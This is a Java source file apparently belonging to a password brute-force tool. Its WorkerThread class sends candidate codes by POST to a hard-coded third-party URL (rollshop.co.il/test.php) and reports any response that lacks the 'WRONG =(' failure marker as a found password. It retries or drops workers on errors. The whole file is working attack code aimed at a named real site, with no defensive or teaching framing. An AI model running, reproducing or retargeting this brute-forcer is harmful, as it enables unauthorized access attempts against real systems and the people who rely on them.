package zipy.co.il;

import javax.net.ssl.HttpsURLConnection;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.URL;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

/**
 * Created by Zloy on 10.06.2017.
 */
public class WorkerThread implements Runnable {

    private static final Logger LOGGER = LoggerFactory.getLogger(WorkerThread.class);

    public static final String URL = "https://www.rollshop.co.il/test.php";
    public static final String VALUE_CONTENT_TYPE = "application/x-www-form-urlencoded";
    public static final String PARAM_CONTENT_TYPE = "Content-Type";
    public static final String REQUEST_METOD = "POST";
    public static final String CODE = "code=";

    private String password;

    private IBruteForce factory;

    private int shot;

    public WorkerThread(String password, IBruteForce factory){
        this.password = password;
        this.factory = factory;
    }

    @Override
    public void run() {
        long timeBegin = System.currentTimeMillis();
        try{

            URL obj = new URL(URL);
            HttpsURLConnection con = (HttpsURLConnection) obj.openConnection();

            con.setRequestMethod(REQUEST_METOD);
            con.setRequestProperty(PARAM_CONTENT_TYPE, VALUE_CONTENT_TYPE);

            String urlParameters = CODE + password;
            con.setDoOutput(true);
            try(DataOutputStream wr = new DataOutputStream(con.getOutputStream())){
                wr.writeBytes(urlParameters);
                wr.flush();
            }

            int responseCode = con.getResponseCode();

            if(responseCode == 200) {
                StringBuilder response = new StringBuilder();
                try (BufferedReader in = new BufferedReader(
                        new InputStreamReader(con.getInputStream()))) {
                    String inputLine;
                    while ((inputLine = in.readLine()) != null) {
                        response.append(inputLine);
                    }
                }
                String respString = response.toString().toUpperCase();
                LOGGER.debug(" work password = " + password + " Response : " + respString);
                if(!respString.contains("WRONG =(")) factory.sendPassword(respString);
            } else {
                LOGGER.debug(" work password = " + password + " get Response Code :" + responseCode);
                throw new IOException("ERROR response code " + responseCode);
            }

        }catch (IOException e){
            if(this.shot++ > 3)factory.sendOutcastWorker(this);
                else {
                    LOGGER.info(" work new. password = " + password, e);
                }

        }
        LOGGER.debug(" End. Password = " + password + " time = " + (System.currentTimeMillis() - timeBegin));
    }
}
